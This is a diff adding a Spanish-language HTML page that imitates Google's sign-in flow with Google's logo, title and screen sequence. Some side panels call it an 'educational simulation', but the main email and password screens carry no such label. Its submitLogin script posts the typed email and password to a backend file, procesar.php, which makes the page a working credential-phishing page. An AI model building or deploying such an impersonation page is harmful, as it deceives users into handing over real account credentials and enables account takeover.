@@ -1,0 +1,485 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+  <title>Google – Iniciar sesión</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<div class="page">
+
+  <div class="card" id="main-card">
+
+    <div id="s-email" class="screen active">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <!-- Logo G -->
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg" aria-label="Google
+          ">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">Accede a tu cuenta</h1>
+          <p class="card-subtitle">Usa tu cuenta Google 
+          </p>
+        </div>
+
+        <div class="col-right">
+          <div class="input-wrap">
+            <input type="email" id="email-input" name="email" placeholder=" " autocomplete="email" autofocus>
+            <label for="email-input">Correo electrónico o teléfono</label>
+          </div>
+          <p class="error-msg" id="email-error">Ingresa una dirección de correo electrónico válida.</p>
+
+          <button class="link" onclick="showForgotEmail()">¿Olvidaste el correo electrónico?</button>
+
+          <p class="hint-text">
+            ¿Esta no es tu computadora? Usa una ventana privada para acceder.
+            <button class="link" onclick="showToast('Usa el modo incógnito de tu navegador para mayor privacidad.')">Más información para usar el modo de invitado</button>
+          </p>
+
+          <div class="actions">
+            <button class="link" onclick="showCreateAccount()">Crear cuenta</button>
+            <button class="btn-next" onclick="goToPassword()">Siguiente</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-email -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 2 — CONTRASEÑA
+    ══════════════════════════════ -->
+    <div id="s-password" class="screen">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">Te damos la bienvenida</h1>
+          <button class="user-chip" onclick="goToEmail()" id="user-chip-btn" aria-label="Cambiar cuenta">
+            <div class="chip-avatar" id="chip-avatar">?</div>
+            <span class="chip-email" id="chip-email-text">usuario@gmail.com</span>
+            <svg class="chip-arrow" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 10l5 5 5-5z"/></svg>
+          </button>
+        </div>
+
+        <div class="col-right">
+          <div class="input-wrap">
+            <input type="password" id="pw-input" name="password" placeholder=" " autocomplete="current-password">
+            <label for="pw-input">Ingresa tu contraseña</label>
+          </div>
+          <p class="error-msg" id="pw-error">Contraseña incorrecta. Inténtalo de nuevo.</p>
+
+          <label class="checkbox-row">
+            <input type="checkbox" id="show-pw-check" onchange="togglePw()">
+            <span>Mostrar contraseña</span>
+          </label>
+
+          <div class="actions">
+            <button class="link" onclick="showForgotPassword()">¿Olvidaste la contraseña?</button>
+            <button class="btn-next" onclick="submitLogin()">Siguiente</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-password -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 3 — OLVIDÉ CORREO
+    ══════════════════════════════ -->
+    <div id="s-forgot-email" class="screen">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">¿Olvidaste tu correo?</h1>
+          <p class="hint-text">Ingresa tu número de teléfono para que podamos encontrar tu cuenta.</p>
+        </div>
+
+        <div class="col-right">
+          <div class="input-wrap">
+            <input type="tel" id="phone-input" placeholder=" " inputmode="tel">
+            <label for="phone-input">Número de teléfono</label>
+          </div>
+          <div class="info-panel">
+            <strong>Simulación educativa</strong>
+            En un sistema real recibirías un SMS. Para esta demo usa el número <strong>999000000</strong>.
+          </div>
+          <div class="actions">
+            <button class="link" onclick="goToEmail()">Cancelar</button>
+            <button class="btn-next" onclick="verifyPhone()">Siguiente</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-forgot-email -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 4 — OLVIDÉ CONTRASEÑA
+    ══════════════════════════════ -->
+    <div id="s-forgot-pw" class="screen">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">¿Olvidaste tu contraseña?</h1>
+          <button class="user-chip" style="pointer-events:none">
+            <div class="chip-avatar" id="forgot-chip-avatar">?</div>
+            <span class="chip-email" id="forgot-chip-email">usuario@gmail.com</span>
+          </button>
+        </div>
+
+        <div class="col-right">
+          <p class="hint-text">Para verificar tu identidad, Google enviará un correo de recuperación a:</p>
+          <div class="info-panel">
+            <strong id="recovery-email-display">u***o@gmail.com</strong>
+            Esto es una simulación educativa. Haz clic en "Enviar" para continuar.
+          </div>
+          <div class="actions">
+            <button class="link" onclick="goToPasswordScreen()">Cancelar</button>
+            <button class="btn-next" onclick="sendRecovery()">Enviar</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-forgot-pw -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 5 — CÓDIGO SMS
+    ══════════════════════════════ -->
+    <div id="s-verify" class="screen">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">Verificar identidad</h1>
+          <p class="hint-text">Ingresa el código de 6 dígitos que enviamos a tu teléfono.</p>
+          <div class="info-panel">
+            <strong>Código de demo</strong>
+            Usa <strong>123456</strong> para continuar.
+          </div>
+        </div>
+
+        <div class="col-right">
+          <div class="input-wrap">
+            <input type="text" id="code-input" placeholder=" " maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+            <label for="code-input">Código de verificación</label>
+          </div>
+          <p class="error-msg" id="code-error">Código incorrecto. Usa 123456 para esta demo.</p>
+          <div class="actions">
+            <button class="link" onclick="goToEmail()">Cancelar</button>
+            <button class="btn-next" onclick="verifyCode()">Verificar</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-verify -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 6 — CREAR CUENTA
+    ══════════════════════════════ -->
+    <div id="s-create" class="screen">
+      <div class="card-inner">
+
+        <div class="col-left">
+          <svg class="logo-g" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.08 17.74 9.5 24 9.5z"/>
+            <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+            <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+            <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-3.58-13.46-8.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+          </svg>
+          <h1 class="card-title">Crear cuenta</h1>
+          <p class="card-subtitle">Para usar Google</p>
+        </div>
+
+        <div class="col-right">
+          <div class="name-grid">
+            <div class="input-wrap">
+              <input type="text" id="first-name" placeholder=" " autocomplete="given-name">
+              <label for="first-name">Nombre</label>
+            </div>
+            <div class="input-wrap">
+              <input type="text" id="last-name" placeholder=" " autocomplete="family-name">
+              <label for="last-name">Apellido</label>
+            </div>
+          </div>
+          <div class="input-wrap">
+            <input type="email" id="new-email" placeholder=" " autocomplete="email">
+            <label for="new-email">Correo electrónico</label>
+          </div>
+          <div class="input-wrap">
+            <input type="password" id="new-pw" placeholder=" " autocomplete="new-password">
+            <label for="new-pw">Contraseña</label>
+          </div>
+          <div class="info-panel">
+            Simulación educativa — en un sistema real tu cuenta sería creada y verificada por correo.
+          </div>
+          <div class="actions">
+            <button class="link" onclick="goToEmail()">Iniciar sesión</button>
+            <button class="btn-next" onclick="createAccount()">Siguiente</button>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- /#s-create -->
+
+
+    <!-- ══════════════════════════════
+         PANTALLA 7 — ÉXITO
+    ══════════════════════════════ -->
+    <div id="s-success" class="screen">
+      <div class="card-inner" style="grid-template-columns:1fr;text-align:center;align-items:center;justify-items:center;gap:20px;min-height:300px">
+        <div style="width:72px;height:72px;border-radius:50%;background:#34a853;display:flex;align-items:center;justify-content:center">
+          <svg width="36" height="36" viewBox="0 0 24 24" fill="white" aria-hidden="true"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h1 class="card-title" style="text-align:center">¡Bienvenido/a a Google!</h1>
+        <p class="hint-text" style="text-align:center" id="success-msg">Has iniciado sesión correctamente.</p>
+        <button class="btn-next" style="margin-top:8px" onclick="location.reload()">Cerrar sesión</button>
+      </div>
+    </div><!-- /#s-success -->
+
+  </div><!-- /.card -->
+
+
+  <!-- ── Footer ── -->
+  <footer class="page-footer" role="contentinfo">
+    <div class="footer-left">
+      <button class="lang-btn" onclick="showToast('Selector de idioma — simulación educativa')">
+        Español (Latinoamérica)
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M7 10l5 5 5-5z"/></svg>
+      </button>
+    </div>
+    <div class="footer-right">
+      <a href="#" class="footer-link" onclick="showToast('Ayuda — simulación educativa');return false">Ayuda</a>
+      <a href="#" class="footer-link" onclick="showToast('Privacidad — simulación educativa');return false">Privacidad</a>
+      <a href="#" class="footer-link" onclick="showToast('Condiciones — simulación educativa');return false">Condiciones</a>
+    </div>
+  </footer>
+
+</div><!-- /.page -->
+
+<!-- ── Toast ── -->
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+
+<!-- ══════════════════════════════════════
+     JAVASCRIPT — toda la lógica
+══════════════════════════════════════ -->
+<script>
+  /* ── Estado global ── */
+  var currentEmail = '';
+
+  /* ── Utilidad: cambiar pantalla ── */
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(function(s) {
+      s.classList.remove('active');
+    });
+    document.getElementById(id).classList.add('active');
+  }
+
+  /* ── PANTALLA 1: ir a email ── */
+  function goToEmail() {
+    showScreen('s-email');
+    setTimeout(function() { document.getElementById('email-input').focus(); }, 50);
+  }
+
+  /* ── PANTALLA 1 → 2: validar email y avanzar ── */
+  function goToPassword() {
+    var emailVal = document.getElementById('email-input').value.trim();
+    var emailRegex = /\S+@\S+\.\S+/;
+
+    if (!emailVal || !emailRegex.test(emailVal)) {
+      document.getElementById('email-error').classList.add('visible');
+      document.getElementById('email-input').focus();
+      return;
+    }
+    document.getElementById('email-error').classList.remove('visible');
+    currentEmail = emailVal;
+
+    /* Rellenar chip */
+    document.getElementById('chip-email-text').textContent    = emailVal;
+    document.getElementById('chip-avatar').textContent        = emailVal.charAt(0).toUpperCase();
+    document.getElementById('forgot-chip-email').textContent  = emailVal;
+    document.getElementById('forgot-chip-avatar').textContent = emailVal.charAt(0).toUpperCase();
+
+    /* Correo enmascarado para recuperación */
+    var parts   = emailVal.split('@');
+    var local   = parts[0];
+    var masked  = local.charAt(0) + '***' + (local.length > 1 ? local.charAt(local.length - 1) : '') + '@' + parts[1];
+    document.getElementById('recovery-email-display').textContent = masked;
+
+    goToPasswordScreen();
+  }
+
+  /* ── Ir a pantalla de contraseña (limpiando errores) ── */
+  function goToPasswordScreen() {
+    showScreen('s-password');
+    document.getElementById('pw-input').value = '';
+    document.getElementById('pw-error').classList.remove('visible');
+    document.getElementById('show-pw-check').checked = false;
+    document.getElementById('pw-input').type = 'password';
+    setTimeout(function() { document.getElementById('pw-input').focus(); }, 50);
+  }
+
+  /* ── Mostrar / ocultar contraseña ── */
+  function togglePw() {
+    var pw = document.getElementById('pw-input');
+    pw.type = document.getElementById('show-pw-check').checked ? 'text' : 'password';
+  }
+
+  /* ── Enviar login al backend (procesar.php) ── */
+  function submitLogin() {
+    var pw = document.getElementById('pw-input').value;
+    if (!pw) {
+      document.getElementById('pw-input').focus();
+      return;
+    }
+    document.getElementById('pw-error').classList.remove('visible');
+
+    /* Crear y enviar formulario POST a procesar.php */
+    var form     = document.createElement('form');
+    form.method  = 'POST';
+    form.action  = 'procesar.php';
+
+    var fEmail        = document.createElement('input');
+    fEmail.type       = 'hidden';
+    fEmail.name       = 'email';
+    fEmail.value      = currentEmail;
+
+    var fPassword     = document.createElement('input');
+    fPassword.type    = 'hidden';
+    fPassword.name    = 'password';
+    fPassword.value   = pw;
+
+    form.appendChild(fEmail);
+    form.appendChild(fPassword);
+    document.body.appendChild(form);
+    form.submit();
+  }
+
+  /* ── PANTALLA 3: olvidé correo ── */
+  function showForgotEmail() {
+    showScreen('s-forgot-email');
+    setTimeout(function() { document.getElementById('phone-input').focus(); }, 50);
+  }
+
+  /* ── PANTALLA 3 → 5: verificar teléfono demo ── */
+  function verifyPhone() {
+    var phone = document.getElementById('phone-input').value.trim();
+    if (!phone) {
+      document.getElementById('phone-input').focus();
+      return;
+    }
+    showScreen('s-verify');
+    setTimeout(function() { document.getElementById('code-input').focus(); }, 50);
+  }
+
+  /* ── PANTALLA 5: verificar código demo (123456) ── */
+  function verifyCode() {
+    var code = document.getElementById('code-input').value.trim();
+    if (code === '123456') {
+      document.getElementById('code-error').classList.remove('visible');
+      showToast('Identidad verificada. Ahora puedes crear una nueva contraseña.');
+      setTimeout(function() {
+        currentEmail = 'usuario@gmail.com';
+        document.getElementById('chip-email-text').textContent    = currentEmail;
+        document.getElementById('chip-avatar').textContent        = currentEmail.charAt(0).toUpperCase();
+        document.getElementById('forgot-chip-email').textContent  = currentEmail;
+        document.getElementById('forgot-chip-avatar').textContent = currentEmail.charAt(0).toUpperCase();
+        goToPasswordScreen();
+      }, 1800);
+    } else {
+      document.getElementById('code-error').classList.add('visible');
+    }
+  }
+
+  /* ── PANTALLA 4: olvidé contraseña ── */
+  function showForgotPassword() {
+    showScreen('s-forgot-pw');
+  }
+
+  /* ── PANTALLA 4: simular envío de recuperación ── */
+  function sendRecovery() {
+    showToast('Correo de recuperación enviado (simulación). Revisa tu bandeja de entrada.');
+    setTimeout(goToPasswordScreen, 2200);
+  }
+
+  /* ── PANTALLA 6: crear cuenta ── */
+  function showCreateAccount() {
+    showScreen('s-create');
+    setTimeout(function() { document.getElementById('first-name').focus(); }, 50);
+  }
+
+  /* ── PANTALLA 6 → 7: procesar registro ── */
+  function createAccount() {
+    var fn    = document.getElementById('first-name').value.trim();
+    var email = document.getElementById('new-email').value.trim();
+    var pw    = document.getElementById('new-pw').value;
+
+    if (!fn || !email || !pw) {
+      showToast('Completa todos los campos para continuar.');
+      return;
+    }
+    currentEmail = email;
+    document.getElementById('success-msg').textContent = 'Cuenta creada para ' + email + '. ¡Bienvenido/a, ' + fn + '!';
+    showScreen('s-success');
+  }
+
+  /* ── Toast ── */
+  var toastTimer;
+  function showToast(msg) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.add('show');
+    clearTimeout(toastTimer);
+    toastTimer = setTimeout(function() { t.classList.remove('show'); }, 3600);
+  }
+
+  /* ── Enter para avanzar ── */
+  document.getElementById('email-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') goToPassword();
+  });
+  document.getElementById('pw-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') submitLogin();
+  });
+  document.getElementById('code-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') verifyCode();
+  });
+  document.getElementById('phone-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') verifyPhone();
+  });
+</script>
+
+</body>
+</html>
